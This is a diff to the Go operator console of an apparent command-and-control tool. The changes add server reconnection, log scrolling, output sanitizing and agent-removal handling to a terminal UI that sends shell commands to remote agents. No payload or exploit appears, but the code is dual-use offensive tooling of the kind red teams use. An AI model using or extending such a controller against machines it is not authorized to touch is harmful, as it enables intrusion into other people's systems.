@@ -8,12 +8,15 @@ import (
 	"log"
 	"sort"
 	"strings"
+	"time"
+	"unicode"
 
 	pb "github.com/ardhptr21/c2-grpc/pb"
 	"github.com/charmbracelet/bubbles/textinput"
 	"github.com/charmbracelet/bubbles/viewport"
 	tea "github.com/charmbracelet/bubbletea"
 	"github.com/charmbracelet/lipgloss"
+	"github.com/charmbracelet/x/ansi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 )
@@ -28,20 +31,35 @@ type operatorEventMsg struct {
 	event *pb.OperatorEvent
 }
 
-type operatorDisconnectedMsg struct{}
+type operatorConnectedMsg struct {
+	stream pb.OperatorService_ConnectClient
+}
+
+type operatorDisconnectedMsg struct {
+	message string
+}
 
 type operatorModel struct {
 	stream       pb.OperatorService_ConnectClient
 	events       chan tea.Msg
 	commandInput textinput.Model
 	logViewport  viewport.Model
-	logs         []string
+	logContent   string
 	agents       map[string]agentRow
 	agentOrder   []string
 	selected     int
 	width        int
 	height       int
 	status       string
+}
+
+type layoutDimensions struct {
+	availableWidth    int
+	leftPaneWidth     int
+	rightPaneWidth    int
+	paneContentHeight int
+	logViewportWidth  int
+	logViewportHeight int
 }
 
 var (
@@ -57,20 +75,11 @@ func main() {
 	serverAddr := flag.String("server", "localhost:50051", "gRPC server address")
 	flag.Parse()
 
-	conn, err := grpc.Dial(*serverAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
-	if err != nil {
-		log.Fatalf("dial error: %v", err)
-	}
-	defer conn.Close()
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
 
-	client := pb.NewOperatorServiceClient(conn)
-	stream, err := client.Connect(context.Background())
-	if err != nil {
-		log.Fatalf("connect error: %v", err)
-	}
-
-	m := newOperatorModel(stream)
-	go receiveEvents(stream, m.events)
+	m := newOperatorModel()
+	go maintainOperatorConnection(ctx, *serverAddr, m.events)
 
 	p := tea.NewProgram(m, tea.WithAltScreen())
 	if _, err := p.Run(); err != nil {
@@ -78,7 +87,7 @@ func main() {
 	}
 }
 
-func newOperatorModel(stream pb.OperatorService_ConnectClient) operatorModel {
+func newOperatorModel() operatorModel {
 	input := textinput.New()
 	input.Placeholder = "Type a command, e.g. ls, whoami, or sysinfo"
 	input.Focus()
@@ -89,12 +98,11 @@ func newOperatorModel(stream pb.OperatorService_ConnectClient) operatorModel {
 	vp.SetContent("Waiting for operator events...")
 
 	return operatorModel{
-		stream:       stream,
 		events:       make(chan tea.Msg, 64),
 		commandInput: input,
 		logViewport:  vp,
 		agents:       make(map[string]agentRow),
-		status:       "Connected. Use ↑/↓ to pick an agent and Enter to dispatch.",
+		status:       "Connecting to server...",
 	}
 }
 
@@ -123,22 +131,58 @@ func (m operatorModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 		m.applyEvent(msg.event)
 		m.refreshLogs()
 		return m, waitForOperatorEvent(m.events)
+	case operatorConnectedMsg:
+		m.stream = msg.stream
+		m.status = "Connected. Use ↑/↓ to pick an agent and Enter to dispatch."
+		return m, waitForOperatorEvent(m.events)
 	case operatorDisconnectedMsg:
-		m.status = "Disconnected from server."
-		return m, tea.Quit
+		m.stream = nil
+		m.agents = make(map[string]agentRow)
+		m.agentOrder = nil
+		m.selected = 0
+		if msg.message != "" {
+			m.status = msg.message
+		} else {
+			m.status = "Disconnected from server. Reconnecting..."
+		}
+		return m, waitForOperatorEvent(m.events)
 	case tea.KeyMsg:
 		switch msg.String() {
 		case "ctrl+c", "q":
-			_ = m.stream.CloseSend()
+			if m.stream != nil {
+				_ = m.stream.CloseSend()
+			}
 			return m, tea.Quit
+		case "pgup", "b":
+			m.logViewport.HalfViewUp()
+			return m, nil
+		case "pgdown", "f":
+			m.logViewport.HalfViewDown()
+			return m, nil
+		case "home":
+			m.logViewport.GotoTop()
+			return m, nil
+		case "end":
+			m.logViewport.GotoBottom()
+			return m, nil
+		case "ctrl+u":
+			m.logViewport.LineUp(10)
+			return m, nil
+		case "ctrl+d":
+			m.logViewport.LineDown(10)
+			return m, nil
 		case "up":
-			if len(m.agentOrder) > 0 && m.selected > 0 {
+			if m.commandInput.Focused() && len(m.agentOrder) > 0 && m.selected > 0 {
 				m.selected--
+			} else {
+				m.logViewport.LineUp(1)
 			}
 			return m, nil
 		case "down":
-			if len(m.agentOrder) > 0 && m.selected < len(m.agentOrder)-1 {
+			if m.commandInput.Focused() && len(m.agentOrder) > 0 && m.selected < len(m.agentOrder)-1 {
 				m.selected++
+			} else {
+				m.logViewport.LineDown(1)
 			}
 			return m, nil
 		case "enter":
@@ -147,8 +191,21 @@ func (m operatorModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 				m.status = "Enter a command first."
 				return m, nil
 			}
+
+			if commandLine == "clear" {
+				m.logContent = ""
+				m.refreshLogs()
+				m.status = "Output pane cleared."
+				m.commandInput.SetValue("")
+				return m, nil
+			}
+
 			if len(m.agentOrder) == 0 {
-				m.status = "No agents connected."
+				if m.stream == nil {
+					m.status = "Disconnected from server. Reconnecting..."
+				} else {
+					m.status = "No agents connected."
+				}
 				return m, nil
 			}
 
@@ -179,23 +236,24 @@ func (m operatorModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 }
 
 func (m operatorModel) View() string {
-	header := titleStyle.Render("ShadowNet Operator") + "\n" + mutedStyle.Render("Live command execution with a remote agent roster.")
-	agentsPane := panelStyle.Width(maxInt(28, m.width/3)).Render(m.renderAgents())
-	logPaneWidth := maxInt(48, m.width-maxInt(28, m.width/3)-8)
-	logPane := panelStyle.Width(logPaneWidth).Height(maxInt(12, m.height-11)).Render(m.logViewport.View())
-	footer := panelStyle.Render(
-		"Selected: " + m.selectedAgentLabel() + "\n" +
-			m.commandInput.View() + "\n" +
-			mutedStyle.Render("Enter dispatches the command to the selected agent. q quits.") + "\n" +
-			m.status,
-	)
+	if m.width <= 0 || m.height <= 0 {
+		return "Loading..."
+	}
 
-	return appStyle.Render(lipgloss.JoinVertical(
+	dims := m.layout()
+	header := m.renderHeader()
+	agentsPane := panelStyle.Width(dims.leftPaneWidth).Height(dims.paneContentHeight).Render(m.renderAgents())
+	logPane := panelStyle.Width(dims.rightPaneWidth).Height(dims.paneContentHeight).Render(m.logViewport.View())
+	footer := m.renderFooter(dims.availableWidth)
+
+	content := appStyle.Render(lipgloss.JoinVertical(
 		lipgloss.Left,
 		header,
 		lipgloss.JoinHorizontal(lipgloss.Top, agentsPane, logPane),
 		footer,
 	))
+
+	return lipgloss.Place(m.width, m.height, lipgloss.Left, lipgloss.Top, content)
 }
 
 func (m *operatorModel) applyEvent(event *pb.OperatorEvent) {
@@ -218,12 +276,12 @@ func (m *operatorModel) applyEvent(event *pb.OperatorEvent) {
 		row.Status = "DEAD"
 		m.agents[event.GetAgentId()] = row
 		m.rebuildAgentOrder()
+	case "agent_removed":
+		delete(m.agents, event.GetAgentId())
+		m.rebuildAgentOrder()
 	}
 
-	m.logs = append(m.logs, formatEvent(event))
-	if len(m.logs) > 400 {
-		m.logs = m.logs[len(m.logs)-400:]
-	}
+	m.appendEvent(event)
 }
 
 func (m *operatorModel) rebuildAgentOrder() {
@@ -241,16 +299,49 @@ func (m *operatorModel) rebuildAgentOrder() {
 }
 
 func (m *operatorModel) refreshLogs() {
-	m.logViewport.SetContent(strings.Join(m.logs, "\n"))
+	m.logViewport.SetContent(m.logContent)
 	m.logViewport.GotoBottom()
 }
 
 func (m *operatorModel) resize() {
-	leftWidth := maxInt(28, m.width/3)
-	rightWidth := maxInt(48, m.width-leftWidth-8)
-	logHeight := maxInt(12, m.height-13)
-	m.logViewport.Width = rightWidth - 4
-	m.logViewport.Height = logHeight - 2
+	dims := m.layout()
+	m.logViewport.Width = dims.logViewportWidth
+	m.logViewport.Height = dims.logViewportHeight
+}
+
+func (m operatorModel) layout() layoutDimensions {
+	appHorizontalFrame, appVerticalFrame := appStyle.GetFrameSize()
+	panelHorizontalFrame, panelVerticalFrame := panelStyle.GetFrameSize()
+
+	availableWidth := maxInt(40, m.width-appHorizontalFrame)
+	leftPaneWidth := maxInt(28, availableWidth/3)
+	rightPaneWidth := maxInt(48, availableWidth-leftPaneWidth)
+
+	header := m.renderHeader()
+	footer := m.renderFooter(availableWidth)
+	contentRowHeight := maxInt(1, m.height-appVerticalFrame-lipgloss.Height(header)-lipgloss.Height(footer))
+
+	return layoutDimensions{
+		availableWidth:    availableWidth,
+		leftPaneWidth:     maxInt(1, leftPaneWidth-panelHorizontalFrame),
+		rightPaneWidth:    maxInt(1, rightPaneWidth-panelHorizontalFrame),
+		paneContentHeight: maxInt(1, contentRowHeight-panelVerticalFrame),
+		logViewportWidth:  maxInt(1, rightPaneWidth-panelHorizontalFrame),
+		logViewportHeight: maxInt(1, contentRowHeight-panelVerticalFrame),
+	}
+}
+
+func (m operatorModel) renderHeader() string {
+	return titleStyle.Render("c2-grpc Operator") + "\n" + mutedStyle.Render("Live command execution with a remote agent roster.")
+}
+
+func (m operatorModel) renderFooter(width int) string {
+	return panelStyle.Width(width).Render(
+		"Selected: " + m.selectedAgentLabel() + "\n" +
+			m.commandInput.View() + "\n" +
+			mutedStyle.Render("Enter dispatches. ↑/↓ select agents. PgUp/PgDn, Home/End, Ctrl+U/Ctrl+D scroll output. q quits.") + "\n" +
+			m.status,
+	)
 }
 
 func (m operatorModel) renderAgents() string {
@@ -281,18 +372,95 @@ func (m operatorModel) selectedAgentLabel() string {
 	return "agent:" + m.agentOrder[m.selected]
 }
 
-func receiveEvents(stream pb.OperatorService_ConnectClient, ch chan<- tea.Msg) {
+func maintainOperatorConnection(ctx context.Context, serverAddr string, ch chan<- tea.Msg) {
 	defer close(ch)
+
 	for {
-		event, err := stream.Recv()
-		if err == io.EOF {
+		if ctx.Err() != nil {
 			return
 		}
+
+		dialCtx, cancelDial := context.WithTimeout(ctx, 5*time.Second)
+		conn, err := grpc.DialContext(
+			dialCtx,
+			serverAddr,
+			grpc.WithTransportCredentials(insecure.NewCredentials()),
+			grpc.WithBlock(),
+		)
+		cancelDial()
 		if err != nil {
-			ch <- operatorDisconnectedMsg{}
-			return
+			select {
+			case <-ctx.Done():
+				return
+			case ch <- operatorDisconnectedMsg{message: fmt.Sprintf("Disconnected from server. Reconnecting to %s...", serverAddr)}:
+			}
+			select {
+			case <-ctx.Done():
+				return
+			case <-time.After(3 * time.Second):
+			}
+			continue
 		}
-		ch <- operatorEventMsg{event: event}
+
+		client := pb.NewOperatorServiceClient(conn)
+		stream, err := client.Connect(ctx)
+		if err != nil {
+			_ = conn.Close()
+			select {
+			case <-ctx.Done():
+				return
+			case ch <- operatorDisconnectedMsg{message: fmt.Sprintf("Disconnected from server. Reconnecting to %s...", serverAddr)}:
+			}
+			select {
+			case <-ctx.Done():
+				return
+			case <-time.After(3 * time.Second):
+			}
+			continue
+		}
+
+		select {
+		case <-ctx.Done():
+			_ = stream.CloseSend()
+			_ = conn.Close()
+			return
+		case ch <- operatorConnectedMsg{stream: stream}:
+		}
+
+		disconnected := false
+		for !disconnected {
+			event, err := stream.Recv()
+			if err == io.EOF {
+				disconnected = true
+				break
+			}
+			if err != nil {
+				disconnected = true
+				break
+			}
+			select {
+			case <-ctx.Done():
+				_ = stream.CloseSend()
+				_ = conn.Close()
+				return
+			case ch <- operatorEventMsg{event: event}:
+			}
+		}
+
+		_ = stream.CloseSend()
+		_ = conn.Close()
+
+		select {
+		case <-ctx.Done():
+			return
+		case ch <- operatorDisconnectedMsg{message: fmt.Sprintf("Disconnected from server. Reconnecting to %s...", serverAddr)}:
+		}
+
+		select {
+		case <-ctx.Done():
+			return
+		case <-time.After(3 * time.Second):
+		}
 	}
 }
 
@@ -302,14 +470,53 @@ func formatEvent(event *pb.OperatorEvent) string {
 		return fmt.Sprintf("[+] agent:%s  %s", event.GetAgentId(), event.GetPayload())
 	case "agent_dead":
 		return fmt.Sprintf("[!] agent:%s  %s", event.GetAgentId(), event.GetPayload())
+	case "agent_removed":
+		return fmt.Sprintf("[-] agent:%s  %s", event.GetAgentId(), event.GetPayload())
 	case "output":
-		return fmt.Sprintf("[>] agent:%s  %s", event.GetAgentId(), event.GetPayload())
+		return event.GetPayload()
 	case "ack":
 		return fmt.Sprintf("[~] agent:%s  %s", event.GetAgentId(), event.GetPayload())
 	case "error":
 		return fmt.Sprintf("[x] agent:%s  %s", event.GetAgentId(), event.GetPayload())
 	default:
 		return fmt.Sprintf("[?] %s agent:%s  %s", event.GetType(), event.GetAgentId(), event.GetPayload())
+	}
+}
+
+func sanitizeOutput(s string) string {
+	s = strings.ReplaceAll(s, "\r\n", "\n")
+	s = strings.ReplaceAll(s, "\r", "\n")
+	s = ansi.Strip(s)
+
+	return strings.Map(func(r rune) rune {
+		if r == '\n' || r == '\t' {
+			return r
+		}
+		if unicode.IsControl(r) {
+			return -1
+		}
+		return r
+	}, s)
+}
+
+func (m *operatorModel) appendEvent(event *pb.OperatorEvent) {
+	entry := formatEvent(event)
+	if entry == "" {
+		return
+	}
+
+	if event.GetType() == "output" {
+		m.logContent += sanitizeOutput(entry)
+	} else {
+		if m.logContent != "" && !strings.HasSuffix(m.logContent, "\n") {
+			m.logContent += "\n"
+		}
+		m.logContent += entry + "\n"
+	}
+
+	const maxLogBytes = 64 * 1024
+	if len(m.logContent) > maxLogBytes {
+		m.logContent = m.logContent[len(m.logContent)-maxLogBytes:]
 	}
 }
 
